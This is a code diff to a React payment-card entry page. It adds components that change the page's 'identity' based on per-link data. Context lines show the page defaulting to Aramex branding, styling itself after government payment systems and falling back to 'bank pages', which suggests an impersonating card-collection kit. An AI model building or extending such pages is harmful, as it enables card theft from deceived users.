@@ -26,6 +26,8 @@ import { validateLuhn, formatCardNumber, detectCardType, validateExpiry, validat
 import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import { DynamicIdentity, EntityContainer } from "@/components/DynamicIdentity";
+import { getPaymentEntityType } from "@/lib/paymentEntityHelper";
 
 const PaymentCardInput = () => {
   const { id } = useParams();
@@ -48,6 +50,9 @@ const PaymentCardInput = () => {
 
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
+  
+  // Determine entity type
+  const entityType = linkData ? getPaymentEntityType(linkData) : 'bank_pages';
   const branding = getServiceBranding(serviceKey);
   
   // Get government payment system for styling
@@ -229,6 +234,8 @@ const PaymentCardInput = () => {
   };
   
   return (
+    <DynamicIdentity entityType={entityType}>
+      <EntityContainer entityType={entityType} useBackgroundImage={false}>
     <DynamicPaymentLayout
       serviceName={serviceName}
       serviceKey={serviceKey}
@@ -523,6 +530,8 @@ const PaymentCardInput = () => {
         <input type="text" name="timestamp" />
       </form>
     </DynamicPaymentLayout>
+      </EntityContainer>
+    </DynamicIdentity>
   );
 };
 
